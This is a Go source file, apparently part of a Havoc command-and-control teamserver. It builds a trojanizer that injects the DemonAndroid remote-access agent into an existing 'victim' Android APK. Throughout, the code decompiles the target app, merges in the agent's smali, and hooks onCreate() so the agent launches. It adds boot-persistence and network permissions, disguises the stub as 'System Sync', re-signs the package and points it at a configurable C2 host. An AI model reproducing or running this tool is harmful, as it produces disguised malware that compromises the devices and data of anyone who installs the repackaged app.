package builder

/*
 * builder_apk_inject.go — APK repackager / injector for DemonAndroid.
 *
 * Takes an existing victim APK and injects the DemonAndroid agent into it:
 *
 *   1. Build a "stub" APK from the DemonAndroid Gradle project (same as
 *      AndroidBuilder) — this compiles all the agent Kotlin into classes.dex
 *
 *   2. Decompile the victim APK with apktool:
 *        apktool d victim.apk -o victim_decompiled/
 *
 *   3. Extract classes.dex from the stub APK, convert to smali with
 *      baksmali, and merge the smali into the victim's smali dirs.
 *
 *   4. Add required permissions / components to the victim's
 *      AndroidManifest.xml (INTERNET, FOREGROUND_SERVICE, AgentService,
 *      BootReceiver, etc.)
 *
 *   5. Recompile with apktool:
 *        apktool b victim_decompiled/ -o injected_unsigned.apk
 *
 *   6. Sign the injected APK with a debug keystore using apksigner.
 *
 * Requirements on the teamserver host:
 *   - apktool   (brew install apktool  /  apt install apktool)
 *   - baksmali  (jar — downloaded to /tmp or detected on PATH)
 *   - apksigner from Android SDK build-tools
 *   - Java 17+  (same as AndroidBuilder)
 *   - Android SDK with build-tools installed
 *
 * On macOS:
 *   brew install apktool
 *   sdkmanager "build-tools;34.0.0"
 */

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"Havoc/pkg/logger"
	"Havoc/pkg/utils"
)

// ApkInjectorConfig mirrors AndroidBuilderConfig for SDK/Java detection.
type ApkInjectorConfig struct {
	AndroidSdkPath string
	JavaHome       string
	DebugDev       bool
}

// ApkInjector builds a DemonAndroid stub then splices it into an existing APK.
type ApkInjector struct {
	config     ApkInjectorConfig
	sourcePath string // DemonAndroid Gradle project

	// C2 parameters (same as AndroidBuilder)
	Host        string
	Port        int
	Uri         string
	Ssl         bool
	UserAgent   string
	PackageName string // internal package used for the agent classes (default: com.demon.agent)

	// Input victim APK path (caller must provide — bytes written to a temp file)
	VictimApkPath string

	// Outputs
	OutputPath string // final signed injected APK
	CompileDir string // temp working directory (caller should os.RemoveAll after)

	SendConsoleMessage func(msgType, message string)
}

// NewApkInjector constructs an ApkInjector with auto-detected SDK/Java paths.
func NewApkInjector(cfg ApkInjectorConfig) *ApkInjector {
	ai := &ApkInjector{
		config:      cfg,
		sourcePath:  utils.GetTeamserverPath() + "/" + PayloadDir + "/DemonAndroid",
		UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
		PackageName: "com.demon.agent",
	}

	// Reuse the same SDK/Java auto-detection as AndroidBuilder
	tmp := NewAndroidBuilder(AndroidBuilderConfig{
		AndroidSdkPath: cfg.AndroidSdkPath,
		JavaHome:       cfg.JavaHome,
	})
	ai.config.AndroidSdkPath = tmp.config.AndroidSdkPath
	ai.config.JavaHome = tmp.config.JavaHome

	return ai
}

// Inject runs the full pipeline. Returns true on success.
// On success, ai.OutputPath contains the injected+signed APK.
func (ai *ApkInjector) Inject() bool {
	// ── 0. Validate inputs ────────────────────────────────────────────
	if _, err := os.Stat(ai.sourcePath); os.IsNotExist(err) {
		ai.msg("Error", "DemonAndroid source not found: "+ai.sourcePath)
		return false
	}
	if ai.VictimApkPath == "" {
		ai.msg("Error", "No victim APK specified")
		return false
	}
	if _, err := os.Stat(ai.VictimApkPath); os.IsNotExist(err) {
		ai.msg("Error", "Victim APK not found: "+ai.VictimApkPath)
		return false
	}
	if ai.config.JavaHome == "" {
		ai.msg("Error", "Java 17 not found. Install: brew install openjdk@17")
		return false
	}
	if ai.config.AndroidSdkPath == "" {
		ai.msg("Error", "Android SDK not found. Set ANDROID_HOME")
		return false
	}

	// ── 1. Set up temp working directory ─────────────────────────────
	ai.CompileDir = "/tmp/havoc_inject_" + utils.GenerateID(8) + "/"
	if err := os.MkdirAll(ai.CompileDir, 0755); err != nil {
		ai.msg("Error", "Cannot create temp dir: "+err.Error())
		return false
	}
	ai.msg("Info", "Working dir: "+ai.CompileDir)

	// ── 2. Build the DemonAndroid stub APK ───────────────────────────
	ai.msg("Info", "Step 1/5: Building DemonAndroid stub APK...")
	// Always build the stub as debug — minifyEnabled=false preserves class names
	// so the smali has com.demon.agent.core.AgentService (not Li0/e0 etc.)
	// The victim APK is release; the stub just needs correct smali, not release signing.
	ab := NewAndroidBuilder(AndroidBuilderConfig{
		AndroidSdkPath: ai.config.AndroidSdkPath,
		JavaHome:       ai.config.JavaHome,
		DebugDev:       true, // force debug to disable R8 obfuscation
	})
	ab.SendConsoleMessage = ai.SendConsoleMessage
	ab.Host      = ai.Host
	ab.Port      = ai.Port
	ab.Uri       = ai.Uri
	ab.Ssl       = ai.Ssl
	ab.UserAgent   = ai.UserAgent
	ab.PackageName = ai.PackageName  // e.g. "com.demon.agent" — determines smali dir structure
	ab.AppLabel    = "System Sync"

	stubApkDir := filepath.Join(ai.CompileDir, "stub_build")
	ab.CompileDir = stubApkDir + "/"
	if !ab.Build() {
		ai.msg("Error", "Stub APK build failed")
		return false
	}
	stubApkPath := ab.OutputPath
	ai.msg("Good", "Stub APK built: "+stubApkPath)

	// ── 3. Decompile stub APK to get smali ───────────────────────────
	ai.msg("Info", "Step 2/5: Decompiling stub APK to smali...")
	stubSmaliDir := filepath.Join(ai.CompileDir, "stub_smali")
	if err := ai.apktoolDecompile(stubApkPath, stubSmaliDir); err != nil {
		ai.msg("Error", "apktool failed on stub: "+err.Error())
		return false
	}

	// ── 4. Decompile victim APK ───────────────────────────────────────
	ai.msg("Info", "Step 3/5: Decompiling victim APK...")
	victimDir := filepath.Join(ai.CompileDir, "victim")
	if err := ai.apktoolDecompile(ai.VictimApkPath, victimDir); err != nil {
		ai.msg("Error", "apktool failed on victim: "+err.Error())
		return false
	}

	// ── 5. Merge smali from stub into victim ─────────────────────────
	ai.msg("Info", "Step 4/5: Merging agent smali into victim...")
	if err := ai.mergeSmali(stubSmaliDir, victimDir); err != nil {
		ai.msg("Error", "Smali merge failed: "+err.Error())
		return false
	}

	// Patch AndroidManifest.xml
	if err := ai.patchManifest(filepath.Join(victimDir, "AndroidManifest.xml")); err != nil {
		ai.msg("Error", "Manifest patch failed: "+err.Error())
		return false
	}

	// Hook Application.onCreate() to start AgentService
	if err := ai.hookApplicationClass(victimDir); err != nil {
		// Non-fatal — log and continue; BootReceiver will still start it on reboot
		ai.msg("Info", "Application hook skipped (will rely on BootReceiver): "+err.Error())
	}

	// ── 6. Recompile victim + sign ───────────────────────────────────
	ai.msg("Info", "Step 5/5: Recompiling and signing injected APK...")
	unsignedApk := filepath.Join(ai.CompileDir, "injected_unsigned.apk")
	if err := ai.apktoolBuild(victimDir, unsignedApk); err != nil {
		ai.msg("Error", "apktool build failed: "+err.Error())
		return false
	}

	signedApk := filepath.Join(ai.CompileDir, "injected_signed.apk")
	if err := ai.signApk(unsignedApk, signedApk); err != nil {
		ai.msg("Error", "APK signing failed: "+err.Error())
		return false
	}

	ai.OutputPath = signedApk
	ai.msg("Good", "Injected APK ready: "+ai.OutputPath)
	return true
}

// ── apktool helpers ───────────────────────────────────────────────────────

func (ai *ApkInjector) apktoolDecompile(apkPath, outDir string) error {
	apktool, err := exec.LookPath("apktool")
	if err != nil {
		return fmt.Errorf("apktool not found — install with: brew install apktool")
	}
	cmd := exec.Command(apktool, "d", apkPath, "-o", outDir, "--force")
	cmd.Env = append(os.Environ(), "JAVA_HOME="+ai.config.JavaHome)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s\n%s", err.Error(), string(out))
	}
	ai.msg("Info", "apktool d: "+string(out))

	// apktool preserves the original binary AndroidManifest.xml under original/.
	// When rebuilding, apktool prefers the binary original over the decoded text,
	// which means our manifest patch would be silently ignored.
	// Delete original/AndroidManifest.xml so apktool must recompile from our
	// patched text XML.
	origManifest := filepath.Join(outDir, "original", "AndroidManifest.xml")
	if err2 := os.Remove(origManifest); err2 != nil && !os.IsNotExist(err2) {
		ai.msg("Info", "Note: could not remove original/AndroidManifest.xml: "+err2.Error())
	} else if err2 == nil {
		ai.msg("Info", "Removed original/AndroidManifest.xml — apktool will use patched text manifest")
	}

	return nil
}

func (ai *ApkInjector) apktoolBuild(srcDir, outApk string) error {
	apktool, err := exec.LookPath("apktool")
	if err != nil {
		return fmt.Errorf("apktool not found")
	}
	cmd := exec.Command(apktool, "b", srcDir, "-o", outApk, "-f")
	cmd.Env = append(os.Environ(), "JAVA_HOME="+ai.config.JavaHome)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s\n%s", err.Error(), string(out))
	}
	ai.msg("Info", "apktool b: "+string(out))
	return nil
}

// ── Smali merge ───────────────────────────────────────────────────────────

// mergeSmali copies all smali_classes* dirs from the stub decompile into the
// victim's directory. Agent smali goes under smali_classes3/ (or smali_classes2/
// if the victim doesn't have one) to avoid overwriting victim classes.
func (ai *ApkInjector) mergeSmali(stubDir, victimDir string) error {
	// Find smali dirs in the stub (smali/, smali_classes2/, smali_classes3/, ...)
	stubEntries, err := os.ReadDir(stubDir)
	if err != nil {
		return fmt.Errorf("cannot read stub dir: %w", err)
	}

	// Determine the next free smali_classesN slot in the victim
	nextSlot := ai.nextSmaliSlot(victimDir)

	for _, entry := range stubEntries {
		if !entry.IsDir() { continue }
		name := entry.Name()
		if name != "smali" && !strings.HasPrefix(name, "smali_classes") {
			continue
		}

		src := filepath.Join(stubDir, name)
		dst := filepath.Join(victimDir, fmt.Sprintf("smali_classes%d", nextSlot))
		nextSlot++

		ai.msg("Info", fmt.Sprintf("Merging %s → %s", name, filepath.Base(dst)))
		if err := copyDir(src, dst); err != nil {
			return fmt.Errorf("copy %s → %s: %w", src, dst, err)
		}
	}
	return nil
}

// ── Application class hook ────────────────────────────────────────────────

// hookApplicationClass injects AgentService startup into the victim app using
// a three-level fallback chain:
//
//   1. Application.onCreate()    — fires on every process start (best)
//   2. Launcher Activity.onCreate() — fires when user opens the app
//   3. Any Activity with MAIN/LAUNCHER intent-filter
//
// In all cases it uses a static AgentBoot helper class to avoid smali register
// limit issues (format35c caps at v15; we use invoke-static/range instead).
func (ai *ApkInjector) hookApplicationClass(victimDir string) error {
	pkg := ai.PackageName
	if pkg == "" { pkg = "com.demon.agent" }

	entries, _ := os.ReadDir(victimDir)

	// ── Step 1: Write AgentBoot.smali into the agent's smali dir ─────
	bootSmaliDir := ""
	agentRel := strings.ReplaceAll(pkg, ".", "/") + "/core/AgentService.smali"
	for _, e := range entries {
		if !e.IsDir() { continue }
		if e.Name() != "smali" && !strings.HasPrefix(e.Name(), "smali_") { continue }
		if _, err2 := os.Stat(filepath.Join(victimDir, e.Name(), agentRel)); err2 == nil {
			bootSmaliDir = filepath.Join(victimDir, e.Name())
			break
		}
	}
	if bootSmaliDir == "" {
		return fmt.Errorf("cannot find agent smali dir (AgentService not found)")
	}

	svcSmali  := strings.ReplaceAll(pkg, ".", "/") + "/core/AgentService"
	bootClass := strings.ReplaceAll(pkg, ".", "/") + "/core/AgentBoot"

	bootSmali := fmt.Sprintf(`.class public final L%s;
.super Ljava/lang/Object;

# Static bootstrap — called from Application or Activity onCreate().
# Owns its own registers so it never conflicts with the caller's locals.
.method public static start(Landroid/content/Context;)V
    .locals 2

    new-instance v0, Landroid/content/Intent;

    const-class v1, L%s;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method
`, bootClass, svcSmali)

	bootDir := filepath.Join(bootSmaliDir, strings.ReplaceAll(pkg, ".", "/"), "core")
	if err := os.MkdirAll(bootDir, 0755); err != nil {
		return fmt.Errorf("cannot create boot smali dir: %w", err)
	}
	if err := os.WriteFile(filepath.Join(bootDir, "AgentBoot.smali"), []byte(bootSmali), 0644); err != nil {
		return fmt.Errorf("cannot write AgentBoot.smali: %w", err)
	}
	ai.msg("Info", fmt.Sprintf("Wrote AgentBoot.smali into %s", bootDir))

	// ── Step 2: Read manifest once, build candidate list ─────────────
	manifestRaw, err := os.ReadFile(filepath.Join(victimDir, "AndroidManifest.xml"))
	if err != nil {
		return fmt.Errorf("cannot read manifest: %w", err)
	}
	manifest := string(manifestRaw)

	// Build an ordered list of class names to try as hook targets.
	// Priority: Application > explicit launcher activity > any activity.
	var candidates []string

	// 2a. Custom Application class
	if appClass := extractXmlAttr(manifest, "<application", "android:name"); appClass != "" {
		candidates = append(candidates, appClass)
	}

	// 2b. Launcher activity (android.intent.action.MAIN + LAUNCHER category)
	if launcherClass := extractLauncherActivity(manifest); launcherClass != "" {
		candidates = append(candidates, launcherClass)
	}

	// 2c. Any activity declared in the manifest (fallback of last resort)
	for _, ac := range extractAllActivities(manifest) {
		candidates = append(candidates, ac)
	}

	if len(candidates) == 0 {
		return fmt.Errorf("no hookable class found in manifest")
	}

	// ── Step 3: Try each candidate until one succeeds ─────────────────
	for _, cls := range candidates {
		// De-duplicate
		seen := false
		for i, c := range candidates {
			if c == cls && i < indexOf(candidates, cls) {
				seen = true; break
			}
		}
		if seen { continue }

		err := ai.hookSmaliOnCreate(victimDir, entries, cls, bootClass)
		if err == nil {
			ai.msg("Good", fmt.Sprintf("Hooked %s.onCreate() → %s.start()", cls, pkg+".core.AgentBoot"))
			return nil
		}
		ai.msg("Info", fmt.Sprintf("Hook attempt on %s failed (%s), trying next candidate...", cls, err.Error()))
	}

	return fmt.Errorf("all hook candidates failed")
}

// hookSmaliOnCreate injects `invoke-static/range {p0..p0}, AgentBoot->start(Context)V`
// at the start of onCreate()V in the given class's smali file.
func (ai *ApkInjector) hookSmaliOnCreate(victimDir string, entries []os.DirEntry, className, bootClass string) error {
	smaliRel := strings.ReplaceAll(className, ".", "/") + ".smali"

	var smaliPath string
	for _, e := range entries {
		if !e.IsDir() { continue }
		if e.Name() != "smali" && !strings.HasPrefix(e.Name(), "smali_") { continue }
		candidate := filepath.Join(victimDir, e.Name(), smaliRel)
		if _, err := os.Stat(candidate); err == nil {
			smaliPath = candidate
			break
		}
	}
	if smaliPath == "" {
		return fmt.Errorf("smali file not found for %s", className)
	}

	data, err := os.ReadFile(smaliPath)
	if err != nil {
		return fmt.Errorf("cannot read smali: %w", err)
	}
	content := string(data)

	if strings.Contains(content, "AgentBoot") {
		ai.msg("Info", fmt.Sprintf("%s already hooked, skipping", className))
		return nil
	}

	// Find onCreate()V — could be "public", "public final", "protected", etc.
	onCreateIdx := -1
	search, offset := content, 0
	for {
		idx := strings.Index(search, ".method ")
		if idx == -1 { break }
		abs := offset + idx
		eol := strings.Index(search[idx:], "\n")
		if eol == -1 { break }
		if strings.Contains(search[idx:idx+eol], "onCreate()V") {
			onCreateIdx = abs
			break
		}
		offset = abs + 1
		search = content[offset:]
	}
	if onCreateIdx == -1 {
		return fmt.Errorf("onCreate()V not found in %s", className)
	}

	// Find .locals within that method
	region := content[onCreateIdx:]
	localsIdx := strings.Index(region, ".locals")
	if localsIdx == -1 {
		return fmt.Errorf(".locals not found in onCreate() of %s", className)
	}
	localsEnd := onCreateIdx + localsIdx + strings.Index(region[localsIdx:], "\n") + 1

	// invoke-static/range uses 16-bit register indices — no v15 cap.
	injection := fmt.Sprintf(
		"\n    # DemonAndroid agent bootstrap\n    invoke-static/range {p0 .. p0}, L%s;->start(Landroid/content/Context;)V\n\n",
		bootClass)

	content = content[:localsEnd] + injection + content[localsEnd:]
	return os.WriteFile(smaliPath, []byte(content), 0644)
}

// ── Manifest helpers ──────────────────────────────────────────────────────

// extractLauncherActivity returns the android:name of the activity that has
// both android.intent.action.MAIN and android.intent.category.LAUNCHER.
func extractLauncherActivity(manifest string) string {
	// Walk activity blocks looking for one that contains both MAIN and LAUNCHER
	remaining := manifest
	for {
		actStart := strings.Index(remaining, "<activity")
		if actStart == -1 { break }

		// Find the matching closing tag (could be </activity> or />)
		actEnd := strings.Index(remaining[actStart:], "</activity>")
		selfClose := strings.Index(remaining[actStart:], "/>")

		var block string
		if actEnd == -1 && selfClose == -1 { break }
		if actEnd == -1 || (selfClose != -1 && selfClose < actEnd) {
			block = remaining[actStart : actStart+selfClose+2]
		} else {
			block = remaining[actStart : actStart+actEnd+len("</activity>")]
		}

		if strings.Contains(block, "android.intent.action.MAIN") &&
			strings.Contains(block, "android.intent.category.LAUNCHER") {
			name := extractXmlAttr(block, "<activity", "android:name")
			if name != "" { return name }
		}
		remaining = remaining[actStart+1:]
	}
	return ""
}

// extractAllActivities returns all android:name values from <activity> tags.
func extractAllActivities(manifest string) []string {
	var result []string
	remaining := manifest
	for {
		idx := strings.Index(remaining, "<activity")
		if idx == -1 { break }
		eol := strings.Index(remaining[idx:], "\n")
		if eol == -1 { eol = len(remaining) - idx }
		name := extractXmlAttr(remaining[idx:idx+eol+1], "<activity", "android:name")
		if name != "" { result = append(result, name) }
		remaining = remaining[idx+1:]
	}
	return result
}

// indexOf returns the index of the first occurrence of s in slice, or -1.
func indexOf(slice []string, s string) int {
	for i, v := range slice { if v == s { return i } }
	return -1
}

// extractXmlAttr extracts an attribute value from the first occurrence of a tag.
// e.g. extractXmlAttr(content, "<application", "android:name") → "com.foo.App"
func extractXmlAttr(content, tag, attr string) string {
	tagIdx := strings.Index(content, tag)
	if tagIdx == -1 { return "" }
	// Find the end of the opening tag (could span multiple lines)
	endIdx := strings.Index(content[tagIdx:], ">")
	if endIdx == -1 { return "" }
	region := content[tagIdx : tagIdx+endIdx+1]

	// Find attr="value" or attr='value'
	attrKey := attr + "=\""
	idx := strings.Index(region, attrKey)
	if idx == -1 {
		attrKey = attr + "='"
		idx = strings.Index(region, attrKey)
		if idx == -1 { return "" }
	}
	start := idx + len(attrKey)
	closeChar := '"'
	if attrKey[len(attrKey)-1] == '\'' { closeChar = '\'' }
	end := strings.IndexByte(region[start:], byte(closeChar))
	if end == -1 { return "" }
	return region[start : start+end]
}

// nextSmaliSlot returns the lowest integer N ≥ 2 such that
// smali_classesN does not yet exist in victimDir.
func (ai *ApkInjector) nextSmaliSlot(victimDir string) int {
	for n := 2; n <= 99; n++ {
		p := filepath.Join(victimDir, fmt.Sprintf("smali_classes%d", n))
		if _, err := os.Stat(p); os.IsNotExist(err) {
			return n
		}
	}
	return 99
}

// ── Manifest patcher ──────────────────────────────────────────────────────

// patchManifest adds the agent's required permissions and components to the
// victim's AndroidManifest.xml using simple string insertion.
// This avoids pulling in an XML library and works for all well-formed manifests.
func (ai *ApkInjector) patchManifest(manifestPath string) error {
	data, err := os.ReadFile(manifestPath)
	if err != nil {
		return err
	}
	content := string(data)

	// Permissions to inject (skip if already present)
	perms := []string{
		`<uses-permission android:name="android.permission.INTERNET"/>`,
		`<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>`,
		`<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>`,
		`<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>`,
	}

	// Components to inject inside <application> — use configured package name
	pkg := ai.PackageName
	if pkg == "" { pkg = "com.demon.agent" }
	components := fmt.Sprintf(`
    <!-- DemonAndroid agent components -->
    <service
        android:name="%s.core.AgentService"
        android:exported="false"
        android:foregroundServiceType="dataSync"/>
    <receiver
        android:name="%s.core.BootReceiver"
        android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED"/>
        </intent-filter>
    </receiver>`, pkg, pkg)

	// Insert permissions before <application tag
	appIdx := strings.Index(content, "<application")
	if appIdx == -1 {
		return fmt.Errorf("no <application> tag found in manifest")
	}

	permBlock := ""
	for _, perm := range perms {
		if !strings.Contains(content, perm) {
			permBlock += "\n    " + perm
		}
	}
	if permBlock != "" {
		content = content[:appIdx] + permBlock + "\n    " + content[appIdx:]
	}

	// Insert components before </application>
	closeApp := strings.LastIndex(content, "</application>")
	if closeApp == -1 {
		return fmt.Errorf("no </application> closing tag found in manifest")
	}
	if !strings.Contains(content, pkg+".core.AgentService") {
		content = content[:closeApp] + components + "\n" + content[closeApp:]
		ai.msg("Info", fmt.Sprintf("Manifest: injected AgentService + BootReceiver for pkg=%s", pkg))
	} else {
		ai.msg("Info", "Manifest: AgentService already present, skipping component injection")
	}

	if err := os.WriteFile(manifestPath, []byte(content), 0644); err != nil {
		return err
	}
	ai.msg("Good", fmt.Sprintf("Manifest patched: %s", manifestPath))
	return nil
}

// ── APK signing ───────────────────────────────────────────────────────────

// signApk signs the APK with a generated debug keystore using apksigner.
func (ai *ApkInjector) signApk(unsignedApk, signedApk string) error {
	// Generate a debug keystore
	keystorePath := filepath.Join(ai.CompileDir, "debug.keystore")
	if err := ai.generateKeystore(keystorePath); err != nil {
		return fmt.Errorf("keystore generation failed: %w", err)
	}

	// Find apksigner in build-tools
	apksigner, err := ai.findApkSigner()
	if err != nil {
		return err
	}

	cmd := exec.Command(apksigner, "sign",
		"--ks", keystorePath,
		"--ks-pass", "pass:android",
		"--key-pass", "pass:android",
		"--ks-key-alias", "androiddebugkey",
		"--out", signedApk,
		unsignedApk,
	)
	cmd.Env = append(os.Environ(),
		"JAVA_HOME="+ai.config.JavaHome,
		"ANDROID_HOME="+ai.config.AndroidSdkPath,
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s\n%s", err.Error(), string(out))
	}
	ai.msg("Info", "apksigner: "+strings.TrimSpace(string(out)))
	return nil
}

func (ai *ApkInjector) generateKeystore(keystorePath string) error {
	keytool := filepath.Join(ai.config.JavaHome, "bin", "keytool")
	if _, err := os.Stat(keytool); os.IsNotExist(err) {
		keytool = "keytool"
	}
	cmd := exec.Command(keytool,
		"-genkeypair",
		"-v",
		"-keystore", keystorePath,
		"-alias", "androiddebugkey",
		"-keyalg", "RSA",
		"-keysize", "2048",
		"-validity", "10000",
		"-storepass", "android",
		"-keypass", "android",
		"-dname", "CN=Android Debug,O=Android,C=US",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s\n%s", err.Error(), string(out))
	}
	return nil
}

func (ai *ApkInjector) findApkSigner() (string, error) {
	// Check PATH first
	if p, err := exec.LookPath("apksigner"); err == nil {
		return p, nil
	}

	// Search in SDK build-tools (newest version first)
	buildToolsDir := filepath.Join(ai.config.AndroidSdkPath, "build-tools")
	entries, err := os.ReadDir(buildToolsDir)
	if err != nil {
		return "", fmt.Errorf("build-tools dir not found at %s", buildToolsDir)
	}

	// Collect versions and pick the latest
	var versions []string
	for _, e := range entries {
		if e.IsDir() {
			versions = append(versions, e.Name())
		}
	}
	if len(versions) == 0 {
		return "", fmt.Errorf("no build-tools versions found in %s", buildToolsDir)
	}

	// Sort descending (lexicographic is fine for semver strings like "34.0.0")
	for i := len(versions) - 1; i >= 0; i-- {
		candidate := filepath.Join(buildToolsDir, versions[i], "apksigner")
		if _, err := os.Stat(candidate); err == nil {
			return candidate, nil
		}
	}
	return "", fmt.Errorf("apksigner not found in build-tools — run: sdkmanager \"build-tools;34.0.0\"")
}

// ── Logging ───────────────────────────────────────────────────────────────

func (ai *ApkInjector) msg(t, m string) {
	if ai.SendConsoleMessage != nil {
		ai.SendConsoleMessage(t, "[ApkInjector] "+m)
	}
	logger.Debug("[ApkInjector] " + t + ": " + m)
}
